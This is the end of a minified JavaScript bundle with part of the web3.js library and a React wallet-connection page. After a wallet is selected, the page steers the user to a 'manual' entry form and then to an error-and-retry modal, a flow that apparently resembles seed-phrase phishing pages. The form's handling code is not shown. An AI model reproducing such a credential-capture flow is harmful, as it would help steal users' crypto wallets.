            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };
    const vL = e => {
            const t = (s, a) => sa(void 0, void 0, void 0, function*() {
                    const l = yield t9(s, e), u = D({
                        format: "bytes"
                    }, a, oe);
                    return eB(l, u)
                }),
                n = s => {
                    const a = tg(s);
                    return Object.assign(Object.assign({}, a), {
                        signTransaction: l => sa(void 0, void 0, void 0, function*() {
                            return t(l, a.privateKey)
                        })
                    })
                },
                r = (s, a, l) => sa(void 0, void 0, void 0, function*() {
                    var u;
                    const c = yield iB(s, a, (u = l == null ? void 0 : l.nonStrict) !== null && u !== void 0 ? u : !0);
                    return Object.assign(Object.assign({}, c), {
                        signTransaction: d => sa(void 0, void 0, void 0, function*() {
                            return t(d, c.privateKey)
                        })
                    })
                }),
                i = () => {
                    const s = rB();
                    return Object.assign(Object.assign({}, s), {
                        signTransaction: a => sa(void 0, void 0, void 0, function*() {
                            return t(a, s.privateKey)
                        })
                    })
                },
                o = new Qu({
                    create: i,
                    privateKeyToAccount: n,
                    decrypt: r
                });
            return {
                signTransaction: t,
                create: i,
                privateKeyToAccount: n,
                decrypt: r,
                recoverTransaction: tB,
                hashMessage: eg,
                sign: bA,
                recover: Up,
                encrypt: xA,
                wallet: o,
                privateKeyToAddress: sf,
                parseAndValidatePrivateKey: Us,
                privateKeyToPublicKey: nB
            }
        },
        yL = {
            version: "4.15.0"
        };
    var wL = function(e, t, n, r) {
            function i(o) {
                return o instanceof n ? o : new n(function(s) {
                    s(o)
                })
            }
            return new(n || (n = Promise))(function(o, s) {
                function a(c) {
                    try {
                        u(r.next(c))
                    } catch (d) {
                        s(d)
                    }
                }

                function l(c) {
                    try {
                        u(r.throw(c))
                    } catch (d) {
                        s(d)
                    }
                }

                function u(c) {
                    c.done ? o(c.value) : i(c.value).then(a, l)
                }
                u((r = r.apply(e, t || [])).next())
            })
        },
        ud;
    (function(e) {
        e.eip6963announceProvider = "eip6963:announceProvider", e.eip6963requestProvider = "eip6963:requestProvider"
    })(ud || (ud = {}));
    const ph = new Map,
        L2 = "web3:providersMapUpdated",
        bL = () => wL(void 0, void 0, void 0, function*() {
            return new Promise((e, t) => {
                typeof window > "u" && t(new Error("window object not available, EIP-6963 is intended to be used within a browser")), window.addEventListener(ud.eip6963announceProvider, n => {
                    ph.set(n.detail.info.uuid, n.detail);
                    const r = new CustomEvent(L2, {
                        detail: ph
                    });
                    window.dispatchEvent(r), e(ph)
                }), window.dispatchEvent(new Event(ud.eip6963requestProvider))
            })
        }),
        xL = e => {
            if (typeof window > "u") throw new Error("window object not available, EIP-6963 is intended to be used within a browser");
            window.addEventListener(L2, e)
        };
    class Ws extends Lt {
        constructor(t = mL) {
            var n;
            (X(t) || typeof t == "string" && t.trim() === "" || typeof t != "string" && !Wu(t) && !t.provider) && console.warn("NOTE: web3.js is running without provider. You need to pass a provider in order to interact with the network!");
            let r = {};
            typeof t == "string" || Wu(t) ? r.provider = t : t ? r = t : r = {}, r.registeredSubscriptions = Object.assign(Object.assign({}, Xp), (n = r.registeredSubscriptions) !== null && n !== void 0 ? n : {}), super(r);
            const i = vL(this);
            this._wallet = i.wallet, this._accountProvider = i, this.utils = jE;
            const o = this;
            class s extends Ki {
                constructor(u, c, d, f, h) {
                    if (Gr(c) && Gr(d)) throw new ly("Should not provide options at both 2nd and 3rd parameters");
                    let v, p = {},
                        w, m;
                    if (!X(c) && typeof c != "object" && typeof c != "string") throw new ly;
                    if (typeof c == "string" && (v = c), Gr(c) ? p = c : Gr(d) ? p = d : p = {}, c instanceof Lt ? w = c : d instanceof Lt ? w = d : f instanceof Lt ? w = f : w = o.getContextObject(), h ? m = h : cr(d) ? m = d : cr(f) && (m = f), super(u, v, p, w, m), super.subscribeToContextEvents(o), !X(a)) {
                        const g = a.getTransactionMiddleware();
                        X(g) || super.setTransactionMiddleware(g)
                    }
                }
            }
            const a = o.use(df);
            this.eth = Object.assign(a, {
                ens: o.use(B2, rd.main),
                Iban: Ge,
                net: o.use(CA),
                personal: o.use(M2),
                Contract: s,
                abi: gL,
                accounts: i
            })
        }
    }
    Ws.version = yL.version;
    Ws.utils = jE;
    Ws.requestEIP6963Providers = bL;
    Ws.onNewProviderDiscovered = xL;
    Ws.modules = {
        Web3Eth: df,
        Iban: Ge,
        Net: CA,
        ENS: B2,
        Personal: M2
    };

    function EL() {
        const [e, t] = b.useState(!1), [n, r] = b.useState(!1), [i, o] = b.useState(!1), [s, a] = b.useState(!1), [l, u] = b.useState(!1), [c, d] = b.useState("MetaMask"), [f, h] = b.useState("others"), [v, p] = b.useState(""), [w, m] = b.useState(null), [g, y] = b.useState(""), x = async () => {
            if (window.ethereum) try {
                await window.ethereum.request({
                    method: "eth_requestAccounts"
                });
                const E = new Ws(window.ethereum);
                m(E);
                const k = await E.eth.getAccounts();
                y(k[0])
            } catch (E) {
                console.error(`Error connecting wallet: ${E.message}`)
            } else console.error("No Web3 wallet found. Please install MetaMask!")
        };
        return console.log({
            web3: w,
            account: g
        }), S.jsxs("div", {
            children: [S.jsx(C5, {
                onConnect: () => o(!0)
            }), S.jsx(P5, {
                onConnect: () => o(!0)
            }), S.jsx(R5, {
                onConnect: () => o(!0)
            }), S.jsx(uk, {}), S.jsx(B5, {
                id: f,
                open: e,
                onClose: () => t(!1),
                onSubmit: E => {
                    t(!1), u(!0), p(E)
                }
            }), S.jsx(M5, {
                open: l,
                walletName: v,
                id: f,
                onClose: () => u(!1),
                handleRetry: () => {
                    u(!1), setTimeout(() => {
                        o(!0)
                    }, 2500)
                }
            }), S.jsx(O5, {
                open: n,
                onClose: () => r(!1),
                handleManual: () => {
                    c !== "WalletConnect" ? (t(!0), r(!1), c !== Xo[f].name && h(c)) : (a(!0), r(!1))
                },
                wallet: c
            }), S.jsx(L5, {
                open: i,
                onClose: () => o(!1),
                handleSelect: async E => {
                    await x(), E === "All Wallets" ? (a(!0), o(!1), d(E)) : (d(E), o(!1), r(!0))
                }
            }), S.jsx(F5, {
                open: s,
                onClose: () => a(!1),
                handleSelect: E => {
                    h(E), a(!1), r(!0), d(Xo[E].name)
                }
            })]
        })
    }
    gh.createRoot(document.getElementById("root")).render(S.jsx(q.StrictMode, {
        children: S.jsx(EL, {})
    }))
});
export default AL();